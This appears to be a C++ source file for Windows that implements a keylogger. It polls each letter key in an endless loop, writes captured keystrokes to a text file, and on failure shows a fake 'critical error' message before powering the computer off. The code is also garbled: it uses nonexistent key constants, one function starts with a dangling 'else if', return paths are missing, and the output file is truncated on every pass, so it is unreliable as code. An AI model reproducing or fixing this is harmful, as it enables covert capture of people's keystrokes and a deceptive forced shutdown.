#include <windows.h>
#include <iostream>
#include <fstream>
char checks();
char cap_check();
int main(){
  //main loop... doesn't break, ever
  while(true==true){
    ofstream file;
    file.open("file.txt");
    if(file.is_open()){
    file<<checks();
    }    
    else{
      cout<<"A critial error has occured";
      cout<<"Windows will now shut down.";
      ExitWindowsEx(EWX_POWEROFF, 0);
      return 0;
    }
  }
}
char checks(){
  //for lowercase letters
  if(GetAsyncKeyState(VK_KEY_A)){
    return 'a';
  }
   else if(GetAsyncKeyState(VK_KEY_B)){
    return 'b';
  }  
  else if(GetAsyncKeyState(VK_KEY_C)){
    return 'c';
  }
   else if(GetAsyncKeyState(VK_KEY_D)){
    return 'd';
  }
   else if(GetAsyncKeyState(VK_KEY_E)){
    return 'e';
  }
    else if(GetAsyncKeyState(VK_KEY_F)){
    return 'f';
  }
    else if(GetAsyncKeyState(VK_KEY_G)){
    return 'g';
  }
    else if(GetAsyncKeyState(VK_KEY_H)){
    return 'h';
  }
    else if(GetAsyncKeyState(VK_KEY_I)){
    return 'i';
  }
    else if(GetAsyncKeyState(VK_KEY_J)){
    return 'j';
  }
    else if(GetAsyncKeyState(VK_KEY_K)){
    return 'k';
  }
    else if(GetAsyncKeyState(VK_KEY_L)){
    return 'l';
  }
    else if(GetAsyncKeyState(VK_KEY_M)){
    return 'm';
  }
    else if(GetAsyncKeyState(VK_KEY_N)){
    return 'n';
  }
    else if(GetAsyncKeyState(VK_KEY_O)){
    return 'o';
  }
    else if(GetAsyncKeyState(VK_KEY_P)){
    return 'p';
  }
    else if(GetAsyncKeyState(VK_KEY_Q)){
    return 'q';
  }
    else if(GetAsyncKeyState(VK_KEY_R)){
    return 'r';
  }
    else if(GetAsyncKeyState(VK_KEY_S)){
    return 's';
  }
    else if(GetAsyncKeyState(VK_KEY_T)){
    return 't';
  }
    else if(GetAsyncKeyState(VK_KEY_U)){
    return 'u';
  }
    else if(GetAsyncKeyState(VK_KEY_V)){
    return 'v';
  }
    else if(GetAsyncKeyState(VK_KEY_W)){
    return 'w';
  }
    else if(GetAsyncKeyState(VK_KEY_X)){
    return 'x';
  }
    else if(GetAsyncKeyState(VK_KEY_Y)){
    return 'y';
  }
    else if(GetAsyncKeyState(VK_KEY_Z)){
    return 'z';
  }
  //checks for caps
  else if(GetAsyncKeyState(VK_RSHIFT)||GetAsyncKeyState(VK_LSHIFT)){
    return cap_check();
  }
}
char cap_check(){
      else if(GetAsyncKeyState(VK_KEY_A)){
    return 'A';
  }
    else if(GetAsyncKeyState(VK_KEY_B)){
    return 'B';
  }  
    else if(GetAsyncKeyState(VK_KEY_D)){
    return 'D';
  }
  else if(GetAsyncKeyState(VK_KEY_C)){
    return 'C';
  }
    else if(GetAsyncKeyState(VK_KEY_E)){
    return 'E';
  }
    else if(GetAsyncKeyState(VK_KEY_F)){
    return 'F';
  }
    else if(GetAsyncKeyState(VK_KEY_G)){
    return 'G';
  }
    else if(GetAsyncKeyState(VK_KEY_H)){
    return 'H';
  }
    else if(GetAsyncKeyState(VK_KEY_I)){
    return 'I';
  }
    else if(GetAsyncKeyState(VK_KEY_J)){
    return 'J';
  }
    else if(GetAsyncKeyState(VK_KEY_K)){
    return 'K';
  }
    else if(GetAsyncKeyState(VK_KEY_L)){
    return 'L';
  }
    else if(GetAsyncKeyState(VK_KEY_M)){
    return 'M';
  }
    else if(GetAsyncKeyState(VK_KEY_N)){
    return 'N';
  }
    else if(GetAsyncKeyState(VK_KEY_O)){
    return 'O';
  }
    else if(GetAsyncKeyState(VK_KEY_P)){
    return 'P';
  }
    else if(GetAsyncKeyState(VK_KEY_Q)){
    return 'Q';
  }
    else if(GetAsyncKeyState(VK_KEY_R)){
    return 'R';
  }
    else if(GetAsyncKeyState(VK_KEY_S)){
    return 'S';
  }
    else if(GetAsyncKeyState(VK_KEY_T)){
    return 'T';
  }
    else if(GetAsyncKeyState(VK_KEY_U)){
    return 'U';
  }
    else if(GetAsyncKeyState(VK_KEY_V)){
    return 'V';
  }
    else if(GetAsyncKeyState(VK_KEY_W)){
    return 'W';
  }
    else if(GetAsyncKeyState(VK_KEY_X)){
    return 'X';
  }
    else if(GetAsyncKeyState(VK_KEY_Y)){
    return 'Y';
  }
    else if(GetAsyncKeyState(VK_KEY_Z)){
    return 'Z';
  }
  
}
